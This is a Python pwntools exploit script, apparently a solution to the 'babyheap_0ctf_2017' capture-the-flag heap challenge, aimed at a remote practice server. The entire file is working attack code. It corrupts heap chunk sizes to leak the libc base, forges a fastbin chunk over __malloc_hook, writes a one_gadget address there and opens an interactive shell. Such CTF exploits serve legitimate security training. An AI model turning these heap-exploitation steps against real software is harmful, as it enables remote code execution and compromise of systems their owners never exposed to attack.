from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
# io = process('babyheap_0ctf_2017')
io = remote('node4.buuoj.cn', 29941)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')


def allocate(size):
	io.sendlineafter('Command: ', '1')
	io.sendlineafter('Size: ', str(size))


def fill(index, size, content):
	io.sendlineafter('Command: ', '2')
	io.sendlineafter('Index: ', str(index))
	io.sendlineafter('Size: ', str(size))
	io.sendafter('Content: ', content)


def free(index):
	io.sendlineafter('Command: ', '3')
	io.sendlineafter('Index: ', str(index))


def dump(index):
	io.sendlineafter('Command: ', '4')
	io.sendlineafter('Index: ', str(index))


def leak_libc():
	global libc_base
	allocate(0x80)							# chunk0
	allocate(0x60)							# chunk1
	allocate(0x60)							# chunk2
	allocate(0x80)							# chunk3
	allocate(0x10)							# chunk4
	fill(2, 0x69, b'b' * 0x68 + p8(0x71))	# change chunk3 size 
	free(2)									# fastbins(0x70) -> chunk2
	free(1)									# fastbins(0x70) -> chunk1 -> chunk2
	payload = b'a' * 0x88 + p64(0x71) + p8(0x70)
	fill(0, 0x91, payload)					# fastbins(0x70) -> chunk1 -> chunk3
	allocate(0x60)							# chunk1
	allocate(0x60)							# chunk2(old chunk3)
	payload = b'b' * 0xd8 + p64(0x91)
	fill(1, 0xe0, payload)					# change chunk3 size back
	free(3)									# unsorted bin <-> chunk3
	dump(2)									# leak libc
	io.recvuntil('Content: \n')
	libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x3c4b78
	log.success('libc_base: ' + hex(libc_base))


def pwn():
	fill(1, 0x70, b'b' * 0x68 + p64(0x71))	# change chunk1 next normal
	free(1)									# fastbins(0x70) -> chunk1
	fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
	payload = b'a' * 0x88 + p64(0x71) + p64(fake_chunk)
	fill(0, 0x98, payload)					# fastbins(0x70) -> chunk1 -> fake_chunk
	allocate(0x60)							# chunk1
	allocate(0x60)							# chunk3(fake_chunk)
	# one_gadget = libc_base + 0x4527a		# for local
	one_gadget = libc_base + 0x4526a		# for remote
	fill(3, 0x1b, b'a' * 0x13 + p64(one_gadget))	# write one_gadget into __malloc_hook
	allocate(1)
	io.interactive()	


if __name__ == '__main__':
	leak_libc()	
	pwn()

